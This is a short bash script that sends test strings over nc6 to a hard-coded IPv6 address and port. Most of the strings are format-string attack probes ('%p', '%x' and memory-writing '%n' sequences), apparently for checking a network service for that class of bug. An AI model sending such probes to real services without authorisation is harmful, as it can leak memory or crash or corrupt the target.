#!/bin/bash

perl -e 'print "\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "Test Test\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "%p%p%p%p\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "%x%x%x%x\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "%x%x%n%n\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "%x%x%n%n\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "%x%x%n%n\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555